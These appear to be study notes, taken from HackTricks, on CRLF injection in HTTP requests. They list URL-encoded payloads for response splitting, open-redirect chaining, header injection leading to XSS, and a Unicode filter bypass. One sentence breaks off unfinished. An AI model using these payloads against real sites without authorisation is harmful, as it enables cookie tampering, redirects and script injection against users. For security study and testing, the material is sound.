Resource from Hacktricks: https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a

Carriage Return (CR) and Line Feed (LF) are used in HTTP request to differentiate between headers and body, split line basically such as at the beginning of line or at the end.

This is URL encoded line breaks basically: home&%0d%0a127.0.0.1

%0d and %0a represent the URL-encoded forms of CR and LF. Post-attack, the log would misleadingly display:

Mostly you try to set the HTTP headers using CRLR requests and this can lead to XSS and Redirections, SSRF, etc

Impact:
1. You can set header using this, so you can do stuff such as XSS, set sensitive information like CSRF token and manipute cookies and stuff:
- I can set headers like Content-Type:text/html, X-XSS-Protection:0 and trick the browswer into believing that in this request the payload comes in text and also the x-xss-protection is 0.

1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test